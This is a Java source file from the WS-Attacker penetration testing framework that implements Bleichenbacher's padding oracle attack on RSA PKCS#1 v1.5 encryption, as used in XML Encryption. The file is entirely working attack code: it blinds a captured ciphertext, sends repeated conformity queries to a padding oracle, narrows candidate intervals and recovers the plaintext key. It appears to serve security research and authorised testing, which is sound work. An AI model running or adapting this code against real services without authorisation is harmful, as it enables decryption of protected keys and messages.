/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework Copyright
 * (C) 2013 Dennis Kupser
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package wsattacker.library.xmlencryptionattack.attackengine.attacker.pkcs1;

import java.math.BigInteger;
import java.security.interfaces.RSAPublicKey;
import java.util.ArrayList;
import org.apache.log4j.Logger;
import wsattacker.library.xmlencryptionattack.attackengine.CryptoAttackException;
import wsattacker.library.xmlencryptionattack.attackengine.Utility;
import wsattacker.library.xmlencryptionattack.attackengine.attackbase.CCAAttack;
import wsattacker.library.xmlencryptionattack.attackengine.oracle.base.AOracle;
import wsattacker.library.xmlencryptionattack.attackengine.oracle.base.request.OracleRequest;
import wsattacker.library.xmlencryptionattack.attackengine.oracle.base.response.OracleResponse;
import wsattacker.library.xmlencryptionattack.attackengine.oracle.base.request.PKCS1OracleRequest;
import static wsattacker.library.xmlencryptionattack.util.XMLEncryptionConstants.CryptoTechnique.ASYMMETRIC;

/**
 * Bleichenbacher algorithm.
 * 
 * @author Christopher Meyer - christopher.meyer@rub.de
 * @author Juraj Somorovsky - juraj.somorovsky@rub.de
 * @version 0.1 May 18, 2012
 */
public class BleichenbacherAttacker
    extends CCAAttack
{

    /**
     * m_Oracle
     */
    // private final AOracle m_Oracle; -> in base class
    /**
     * encrypted original message
     */
    private final byte[] encryptedKey;

    /**
     * public key
     */
    protected final RSAPublicKey publicKey;

    private BigInteger c0;

    private BigInteger s0;

    protected BigInteger si;

    private Interval[] m;

    protected final int blockSize;

    private final BigInteger bigB;

    private final boolean msgIsPKCS;

    private byte[] result;

    /**
     * Initialize the log4j LOG.
     */
    static Logger LOG = Logger.getLogger( BleichenbacherAttacker.class );

    /**
     * Generates an instance of Bleichenbacher Attacker. We assume that the first two bytes of the decrypted message are
     * correctly set to 0x00 0x02
     * 
     * @param encryptedKey encrypted key
     * @param pkcsOracle m_Oracle
     */
    public BleichenbacherAttacker( final byte[] encryptedKey, final AOracle pkcsOracle )
        throws CryptoAttackException
    {
        this( encryptedKey, pkcsOracle, true );
    }

    /**
     * Generates an instance of Bleichenbacher Attacker
     * 
     * @param encryptedKey encrypted key
     * @param pkcsOracle m_Oracle
     * @param msgPKCScofnorm if set to true, we know that the message starts definitely with 0x00 0x02 and thus we can
     *            omit step 1 (this is the typical case by the attacks)
     */
    public BleichenbacherAttacker( final byte[] encryptedKey, final AOracle pkcsOracle, final boolean msgPKCScofnorm )
    {
        this.m_CryptoTechnique = ASYMMETRIC;
        this.encryptedKey = encryptedKey.clone();
        this.publicKey = pkcsOracle.getPublicKey();
        this.m_Oracle = pkcsOracle;
        this.msgIsPKCS = msgPKCScofnorm;
        c0 = BigInteger.ZERO;
        si = BigInteger.ZERO;
        m = null;

        this.blockSize = this.publicKey.getModulus().bitLength() / 8;

        // b computation
        int tmp = publicKey.getModulus().bitLength();
        while ( tmp % 8 != 0 )
        {
            tmp++;
        }
        tmp = ( ( tmp / 8 ) - 2 ) * 8;
        bigB = BigInteger.valueOf( 2 ).pow( tmp );
        LOG.info( "B computed: " + bigB.toString( 16 ) );
        LOG.info( "Blocksize: " + blockSize + " bytes" );
    }

    @Override
    public byte[] executeAttack()
        throws CryptoAttackException
    {
        int i = 0;
        boolean solutionFound = false;

        LOG.info( "Step 1: Blinding" );
        if ( this.msgIsPKCS )
        {
            LOG.info( "Step skipped --> " + "Message is considered as PKCS compliant." );
            s0 = BigInteger.ONE;
            c0 = new BigInteger( 1, encryptedKey );
            m =
                new Interval[] { new Interval( BigInteger.valueOf( 2 ).multiply( bigB ),
                                               ( BigInteger.valueOf( 3 ).multiply( bigB ) ).subtract( BigInteger.ONE ) ) };
        }
        else
        {
            stepOne();
        }

        i++;

        while ( !solutionFound )
        {
            LOG.info( "Step 2: Searching for PKCS conforming messages." );
            stepTwo( i );

            LOG.info( "Step 3: Narrowing the set of soultions." );
            stepThree( i );

            LOG.info( "Step 4: Computing the solution." );
            solutionFound = stepFour( i );
            i++;

            LOG.info( "// Total # of queries so far: " + m_Oracle.getNumberOfQueries() );
        }
        return result;
    }

    private void stepOne()
        throws CryptoAttackException
    {
        BigInteger n = publicKey.getModulus();
        BigInteger ciphered = new BigInteger( 1, encryptedKey );

        byte[] tmp;
        byte[] send;
        OracleResponse response;

        do
        {
            si = si.add( BigInteger.ONE );
            send = prepareMsg( ciphered, si );

            // check PKCS#1 conformity
            OracleRequest request = new PKCS1OracleRequest( send );
            response = m_Oracle.queryOracle( request );
        }
        while ( response.getResult() != OracleResponse.Result.VALID );

        c0 = new BigInteger( 1, send );
        s0 = si;
        // mi = {[2B,3B-1]}
        m =
            new Interval[] { new Interval( BigInteger.valueOf( 2 ).multiply( bigB ),
                                           ( BigInteger.valueOf( 3 ).multiply( bigB ) ).subtract( BigInteger.ONE ) ) };

        LOG.info( " Found s0 : " + si );
    }

    private void stepTwo( final int i )
        throws CryptoAttackException
    {
        byte[] send;
        BigInteger n = publicKey.getModulus();

        if ( i == 1 )
        {
            this.stepTwoA();
        }
        else
        {
            if ( i > 1 && m.length >= 2 )
            {
                stepTwoB();
            }
            else if ( m.length == 1 )
            {
                stepTwoC();
            }
        }

        LOG.info( " Found s" + i + ": " + si );
    }

    private void stepTwoA()
        throws CryptoAttackException
    {
        byte[] send;
        BigInteger n = publicKey.getModulus();

        LOG.info( "Step 2a: Starting the search" );
        // si = ceil(n/(3B))
        BigInteger tmp[] = n.divideAndRemainder( BigInteger.valueOf( 3 ).multiply( bigB ) );
        if ( BigInteger.ZERO.compareTo( tmp[1] ) != 0 )
        {
            si = tmp[0].add( BigInteger.ONE );
        }
        else
        {
            si = tmp[0];
        }

        // correction will be done in do while
        si = si.subtract( BigInteger.ONE );

        OracleResponse response;
        do
        {
            si = si.add( BigInteger.ONE );
            send = prepareMsg( c0, si );

            // check PKCS#1 conformity
            // check PKCS#1 conformity
            OracleRequest request = new PKCS1OracleRequest( send );
            response = m_Oracle.queryOracle( request );
        }
        while ( response.getResult() != OracleResponse.Result.VALID );
    }

    private void stepTwoB()
        throws CryptoAttackException
    {
        byte[] send;
        OracleResponse response;
        LOG.info( "Step 2b: Searching with more than" + " one interval left" );

        do
        {
            si = si.add( BigInteger.ONE );
            send = prepareMsg( c0, si );

            // check PKCS#1 conformity
            OracleRequest request = new PKCS1OracleRequest( send );
            response = m_Oracle.queryOracle( request );
        }
        while ( response.getResult() != OracleResponse.Result.VALID );
    }

    private void stepTwoC()
        throws CryptoAttackException
    {
        byte[] send;
        OracleResponse response;
        BigInteger n = publicKey.getModulus();

        LOG.info( "Step 2c: Searching with one interval left" );

        // initial ri computation - ri = 2(b*(si-1)-2*B)/n
        BigInteger ri = si.multiply( m[0].upper );
        ri = ri.subtract( BigInteger.valueOf( 2 ).multiply( bigB ) );
        ri = ri.multiply( BigInteger.valueOf( 2 ) );
        ri = ri.divide( n );

        // initial si computation
        BigInteger upperBound = step2cComputeUpperBound( ri, n, m[0].lower );
        BigInteger lowerBound = step2cComputeLowerBound( ri, n, m[0].upper );

        // to counter .add operation in do while
        si = lowerBound.subtract( BigInteger.ONE );

        do
        {
            si = si.add( BigInteger.ONE );
            // lowerBound <= si < upperBound
            if ( si.compareTo( upperBound ) > 0 )
            {
                // new values
                ri = ri.add( BigInteger.ONE );
                upperBound = step2cComputeUpperBound( ri, n, m[0].lower );
                lowerBound = step2cComputeLowerBound( ri, n, m[0].upper );
                si = lowerBound;
                // System.out.println("slower: " + lowerBound);
                // System.out.println("sgoal:  " +
                // (BigInteger.valueOf(3).multiply(bigB).add(ri.multiply(n))).divide(new
                // BigInteger(decryptedMsg)));
                // System.out.println("supper: " + upperBound);
            }
            send = prepareMsg( c0, si );

            // check PKCS#1 conformity
            OracleRequest request = new PKCS1OracleRequest( send );
            response = m_Oracle.queryOracle( request );
        }
        while ( response.getResult() != OracleResponse.Result.VALID );
    }

    private void stepThree( final int i )
    {
        BigInteger n = publicKey.getModulus();
        BigInteger r;
        BigInteger upperBound;
        BigInteger lowerBound;
        BigInteger max;
        BigInteger min;
        BigInteger[] tmp;
        ArrayList<Interval> ms = new ArrayList<Interval>( 15 );

        for ( Interval interval : m )
        {
            upperBound = step3ComputeUpperBound( si, n, interval.upper );
            lowerBound = step3ComputeLowerBound( si, n, interval.lower );

            r = lowerBound;
            // lowerBound <= r <= upperBound
            while ( r.compareTo( upperBound ) < 1 )
            {
                // ceil((2*B+r*n)/si)
                max = ( BigInteger.valueOf( 2 ).multiply( bigB ) ).add( r.multiply( n ) );
                tmp = max.divideAndRemainder( si );
                if ( BigInteger.ZERO.compareTo( tmp[1] ) != 0 )
                {
                    max = tmp[0].add( BigInteger.ONE );
                }
                else
                {
                    max = tmp[0];
                }

                // floor((3*B-1+r*n)/si
                min = BigInteger.valueOf( 3 ).multiply( bigB );
                min = min.subtract( BigInteger.ONE );
                min = min.add( r.multiply( n ) );
                min = min.divide( si );

                // build new interval
                if ( interval.lower.compareTo( max ) > 0 )
                {
                    max = interval.lower;
                }
                if ( interval.upper.compareTo( min ) < 0 )
                {
                    min = interval.upper;
                }
                if ( max.compareTo( min ) <= 0 )
                {
                    ms.add( new Interval( max, min ) );
                    // System.out.println("lower: " + max.toString(16));
                    // System.out.println("goal:  " + new
                    // BigInteger(encryptedKey).toString(16));
                    // System.out.println("upper: " + min.toString(16));
                    // System.out.println(" new interval for M"
                    // + i + ": [" + max + ", " + min + "]");
                }
                // one further....
                r = r.add( BigInteger.ONE );
            }
        }

        LOG.info( " # of intervals for M" + i + ": " + ms.size() );
        m = ms.toArray( new Interval[ms.size()] );
    }

    private boolean stepFour( final int i )
    {
        boolean resultFound = false;

        if ( m.length == 1 && m[0].lower.compareTo( m[0].upper ) == 0 )
        {
            BigInteger solution = s0.modInverse( publicKey.getModulus() );
            solution = solution.multiply( m[0].upper ).mod( publicKey.getModulus() );

            result = solution.toByteArray();
            LOG.info( "====> Solution found!\n" + Utility.bytesToHex( result ) );
            resultFound = true;
        }

        return resultFound;
    }

    private BigInteger step3ComputeUpperBound( final BigInteger s, final BigInteger modulus,
                                               final BigInteger upperIntervalBound )
    {
        BigInteger upperBound = upperIntervalBound.multiply( s );
        upperBound = upperBound.subtract( BigInteger.valueOf( 2 ).multiply( bigB ) );
        // ceil
        BigInteger[] tmp = upperBound.divideAndRemainder( modulus );
        if ( BigInteger.ZERO.compareTo( tmp[1] ) != 0 )
        {
            upperBound = BigInteger.ONE.add( tmp[0] );
        }
        else
        {
            upperBound = tmp[0];
        }

        return upperBound;
    }

    private BigInteger step3ComputeLowerBound( final BigInteger s, final BigInteger modulus,
                                               final BigInteger lowerIntervalBound )
    {
        BigInteger lowerBound = lowerIntervalBound.multiply( s );
        lowerBound = lowerBound.subtract( BigInteger.valueOf( 3 ).multiply( bigB ) );
        lowerBound = lowerBound.add( BigInteger.ONE );
        lowerBound = lowerBound.divide( modulus );

        return lowerBound;
    }

    private BigInteger step2cComputeLowerBound( final BigInteger r, final BigInteger modulus,
                                                final BigInteger upperIntervalBound )
    {
        BigInteger lowerBound = BigInteger.valueOf( 2 ).multiply( bigB );
        lowerBound = lowerBound.add( r.multiply( modulus ) );
        lowerBound = lowerBound.divide( upperIntervalBound );

        return lowerBound;
    }

    private BigInteger step2cComputeUpperBound( final BigInteger r, final BigInteger modulus,
                                                final BigInteger lowerIntervalBound )
    {
        BigInteger upperBound = BigInteger.valueOf( 3 ).multiply( bigB );
        upperBound = upperBound.add( r.multiply( modulus ) );
        upperBound = upperBound.divide( lowerIntervalBound );

        return upperBound;
    }

    /**
     * @param originalMessage original message to be changed
     * @param si factor
     * @return
     */
    protected byte[] prepareMsg( final BigInteger originalMessage, final BigInteger si )
    {
        byte[] msg;
        BigInteger tmp;

        if ( m_Oracle.getNumberOfQueries() % 100 == 0 )
        {
            LOG.info( "# of queries so far: " + m_Oracle.getNumberOfQueries() );
        }

        // // if we use a real m_Oracle (not a plaintext m_Oracle), the si value
        // has
        // // to be encrypted first.
        // if (!m_Oracle.isPlaintextOracle()) {
        // // encrypt: si^e mod n
        tmp = si.modPow( publicKey.getPublicExponent(), publicKey.getModulus() );
        // } else {
        // tmp = si;
        // }

        // blind: c0*(si^e) mod n
        // or: m*si mod n (in case of plaintext m_Oracle)
        tmp = originalMessage.multiply( tmp );
        tmp = tmp.mod( publicKey.getModulus() );
        // get bytes
        msg = AttackerUtility.correctSize( tmp.toByteArray(), blockSize, true );

        return msg;
    }
}
